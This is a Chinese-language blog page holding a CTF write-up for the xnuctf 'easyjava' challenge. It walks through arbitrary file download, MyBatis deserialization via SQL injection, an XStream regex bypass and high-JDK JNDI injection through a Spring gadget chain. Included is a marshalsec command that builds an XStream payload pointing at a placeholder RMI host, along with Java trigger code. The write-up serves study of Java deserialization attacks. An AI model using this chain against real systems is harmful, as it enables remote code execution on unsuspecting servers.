@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,代码审计,java," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言简单地来说就是被打哭了，我是谁，我在哪，为什么这么菜，，，，不过题的质量绝对一流。 解题流程 download 任意文件下载结合&#x2F;proc&#x2F;self&#x2F;fd&#x2F;x 下载jar包并还原审计。 mybaits反序列化，这里主要通过sql注入提供了一个反序列化的触发点。 Xstream简单的正则绕过。 高版本jndi注入加上spring jndi无参数反序列化链。  学习记录快速还原jar包到代码 没经">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xnuctf_easyjava复现">
+<meta property="og:url" content="http://www.star123.top/2020/11/06/xnuctf-easyjava%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言简单地来说就是被打哭了，我是谁，我在哪，为什么这么菜，，，，不过题的质量绝对一流。 解题流程 download 任意文件下载结合&#x2F;proc&#x2F;self&#x2F;fd&#x2F;x 下载jar包并还原审计。 mybaits反序列化，这里主要通过sql注入提供了一个反序列化的触发点。 Xstream简单的正则绕过。 高版本jndi注入加上spring jndi无参数反序列化链。  学习记录快速还原jar包到代码 没经">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/11/06/5gaO8mhEGSXI74Y.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/07/tNESg9elYanTFkm.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/09/O16cXNVloYzCRBp.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/09/bQ871vLp2mDBK9W.png">
+<meta property="article:published_time" content="2020-11-06T07:56:02.000Z">
+<meta property="article:modified_time" content="2020-11-09T14:50:39.294Z">
+<meta property="article:author" content="star">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/11/06/5gaO8mhEGSXI74Y.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2020/11/06/xnuctf-easyjava复现/"/>
+
+
+
+
+
+  <title>xnuctf_easyjava复现 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/11/06/xnuctf-easyjava%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xnuctf_easyjava复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-11-06T15:56:02+08:00">
+                2020-11-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单地来说就是被打哭了，我是谁，我在哪，为什么这么菜，，，，不过题的质量绝对一流。</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><ol>
+<li>download 任意文件下载结合/proc/self/fd/x 下载jar包并还原审计。</li>
+<li>mybaits反序列化，这里主要通过sql注入提供了一个反序列化的触发点。</li>
+<li>Xstream简单的正则绕过。</li>
+<li>高版本jndi注入加上spring jndi无参数反序列化链。</li>
+</ol>
+<h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="快速还原jar包到代码"><a href="#快速还原jar包到代码" class="headerlink" title="快速还原jar包到代码"></a>快速还原jar包到代码</h3><ul>
+<li><p>没经验，耽误了很多时间。主要就是通过jd-gui保存所有源码然后放到空项目里面去，但是jd-gui会反编译jar包，所以这里推荐使用一款叫Luyten的工具，也是全部保存就好了。</p>
+</li>
+<li><p>然后idea新建空项目，我这里选择了springboot项目（进来删除.mvn，然后互maven换个源快点），按照目录依次拷贝文件。</p>
+<p><img src="https://i.loli.net/2020/11/06/5gaO8mhEGSXI74Y.png" alt="image-20201106213248755"></p>
+<ul>
+<li>这里我偷了懒，直接改pom.xml文件重新加载依赖（其实最好还是把文件加到extra lib里面去好点）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="spring-jndi利用链学习"><a href="#spring-jndi利用链学习" class="headerlink" title="spring jndi利用链学习"></a>spring jndi利用链学习</h3><ul>
+<li><p>对java一些常用的利用链没概念，资料收集的工作没做好，不过算是复现了mysql-connector 8的二次反序列化漏洞。（中途发现8.0.21的二次反序列化被修复了，把原来getObject的位置改成了getString）</p>
+</li>
+<li><p>SpringAbstractBeanFactoryPointcutAdvisor链，这里直接参考marsec工具。</p>
+<ol>
+<li><p>HashTable(a,b) readObject还原时插入对象会触发equal方法</p>
+</li>
+<li><p>DefaultBeanFactoryPointcutAdvisor 的equal方法(由子类AbstractPointcutAdvisor实现) 调用getAdvice</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(@Nullable Object other)</span> </span>&#123;</span><br><span class="line">     ...</span><br><span class="line">            <span class="keyword">return</span> ObjectUtils.nullSafeEquals(<span class="keyword">this</span>.getAdvice(), otherAdvisor.getAdvice()) &amp;&amp; ObjectUtils.nullSafeEquals(<span class="keyword">this</span>.getPointcut(), otherAdvisor.getPointcut());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ul>
+<ol start="3">
+<li><p>DefaultBeanFactoryPointcutAdvisor的子类AbstractPointcutAdvisor（也是AbstractPointcutAdvisor的父类），调用beanFactory的getBean方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Advice <span class="title">getAdvice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Advice advice = <span class="keyword">this</span>.advice;</span><br><span class="line">        <span class="keyword">if</span> (advice != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> advice;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Assert.state(<span class="keyword">this</span>.adviceBeanName != <span class="keyword">null</span>, <span class="string">"'adviceBeanName' must be specified"</span>);</span><br><span class="line">            Assert.state(<span class="keyword">this</span>.beanFactory != <span class="keyword">null</span>, <span class="string">"BeanFactory must be set to resolve 'adviceBeanName'"</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.beanFactory.isSingleton(<span class="keyword">this</span>.adviceBeanName)) &#123;</span><br><span class="line">                advice = (Advice)<span class="keyword">this</span>.beanFactory.getBean(<span class="keyword">this</span>.adviceBeanName, Advice<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                <span class="keyword">this</span>.advice = advice;</span><br><span class="line">                <span class="keyword">return</span> advice;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="keyword">this</span>.adviceMonitor) &#123;</span><br><span class="line">                    advice = <span class="keyword">this</span>.advice;</span><br><span class="line">                    <span class="keyword">if</span> (advice == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        advice = (Advice)<span class="keyword">this</span>.beanFactory.getBean(<span class="keyword">this</span>.adviceBeanName, Advice<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                        <span class="keyword">this</span>.advice = advice;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> advice;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>跟踪下getBean，查找接口的实现类，</p>
+<p><img src="https://i.loli.net/2020/11/07/tNESg9elYanTFkm.png" alt="image-20201107234250955"></p>
+<p>跟进SimpleJndiBeanFactory，发现存在lookup方法，存在jndi注入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.isSingleton(name) ? <span class="keyword">this</span>.doGetSingleton(name, requiredType) : <span class="keyword">this</span>.lookup(name, requiredType);</span><br><span class="line">        &#125; </span><br><span class="line">  ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> &lt;T&gt; <span class="function">T <span class="title">doGetSingleton</span><span class="params">(String name, @Nullable Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>.singletonObjects) &#123;</span><br><span class="line">            Object singleton = <span class="keyword">this</span>.singletonObjects.get(name);</span><br><span class="line">            <span class="keyword">if</span> (singleton != <span class="keyword">null</span>) &#123;</span><br><span class="line">               ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                T jndiObject = <span class="keyword">this</span>.lookup(name, requiredType);</span><br><span class="line">                <span class="keyword">this</span>.singletonObjects.put(name, jndiObject);</span><br><span class="line">                <span class="keyword">return</span> jndiObject;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回顾下整个利用链</p>
+<ul>
+<li>Hashtable-&gt;equal</li>
+</ul>
+<p>​    设置两个DefaultBeanFactoryPointcutAdvisor对象</p>
+<ul>
+<li>DefaultBeanFactoryPointcutAdvisor-&gt;getAdvice (this-&gt;SimpleJndiBeanFactory-&gt;getBean)</li>
+</ul>
+<p>​    设置adviceBeanName (jndi url)</p>
+<p>​    设置beanFactory对象</p>
+<ul>
+<li><p>SimpleJndiBeanFactory-&gt;getBean-&gt;lookup</p>
+<p>payload</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.XStream SpringAbstractBeanFactoryPointcutAdvisor rmi://xxx:xxx/target</span><br></pre></td></tr></table></figure>
+
+<p>然后自己写payload的时候和marsec的payload对比了下，发现marsec将beanFactory和jnditemplate的logger都设置为了NoOpLog。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BeanFactory <span class="title">makeJNDITrigger</span> <span class="params">( String jndiUrl )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SimpleJndiBeanFactory bf = <span class="keyword">new</span> SimpleJndiBeanFactory();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line">        Reflections.setFieldValue(bf, <span class="string">"logger"</span>, <span class="keyword">new</span> NoOpLog());</span><br><span class="line">        Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">"logger"</span>, <span class="keyword">new</span> NoOpLog());</span><br><span class="line">        <span class="keyword">return</span> bf;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不设置可能造成对象转换失败的结果。</p>
+</li>
+</ol>
+<h3 id="jdk高本版jndi注入学习"><a href="#jdk高本版jndi注入学习" class="headerlink" title="jdk高本版jndi注入学习"></a>jdk高本版jndi注入学习</h3><p>​        jndi这个利用手法简单地理解就是远程加载恶意类执行，然而jdk高版本不允许远程加载恶意类，所以这里的利用手法就是加载classpath中，加载实现objectFactory的接口的Factory类进行利用。</p>
+<p>​    <img src="https://i.loli.net/2020/11/09/O16cXNVloYzCRBp.png" alt="image-20201109221129978"></p>
+<p>​        NameingManager中的getObjectInstance方法中会获取Factory，而Factory的名称在恶意reference中可控，可以通过加载恶意Factory的方法来实现利用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        而spring Boot集成的tomcat中有一个类刚好可以利用。具体细节可以参考这篇文章。<a href="https://paper.seebug.org/942/#classreference-factory" target="_blank" rel="noopener">高版本利用jndi</a>,主要的思路就是利用将Factory的一个setter替换为javax.el.ELProcessor的eval方法，执行代码。</p>
+<p>​        在ysomap可以很方便地设置</p>
+<p>​    <img src="https://i.loli.net/2020/11/09/bQ871vLp2mDBK9W.png" alt="image-20201109223603572"></p>
+<p>​        利用即可。</p>
+<h3 id="xStream绕过技巧学习"><a href="#xStream绕过技巧学习" class="headerlink" title="xStream绕过技巧学习"></a>xStream绕过技巧学习</h3><p>​        主要是绕过一个正则，其中xml属性的值和标签中的内容都可以用html编码来绕过，而xml标签则可以使用_.00xx这样_.16进制数据的形式来替代，更多的姿势可以从本题的wp中看到。wp中给出了题目的exp，上传图片即可。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        这个题总结下来说难不难，说简单不简单，java的题还是一个思路的问题。思路走对了，其实很多时候有相当多可以利用的研究成果，比赛时比较可惜的是没有找到反序列化的利用链导致整道题没出来。这么一遍复现下来，基本上就把java jndi注入和反序列化链的思路给理清楚了，这算是一个不错的提升吧。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+          
+            <a href="/tags/java/" rel="tag"># java</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/10/22/tp5-0-rce%E7%A0%94%E7%A9%B6/" rel="next" title="tp5.0_rce研究">
+                <i class="fa fa-chevron-left"></i> tp5.0_rce研究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题流程"><span class="nav-number">2.</span> <span class="nav-text">解题流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#学习记录"><span class="nav-number">3.</span> <span class="nav-text">学习记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#快速还原jar包到代码"><span class="nav-number">3.1.</span> <span class="nav-text">快速还原jar包到代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#spring-jndi利用链学习"><span class="nav-number">3.2.</span> <span class="nav-text">spring jndi利用链学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jdk高本版jndi注入学习"><span class="nav-number">3.3.</span> <span class="nav-text">jdk高本版jndi注入学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xStream绕过技巧学习"><span class="nav-number">3.4.</span> <span class="nav-text">xStream绕过技巧学习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
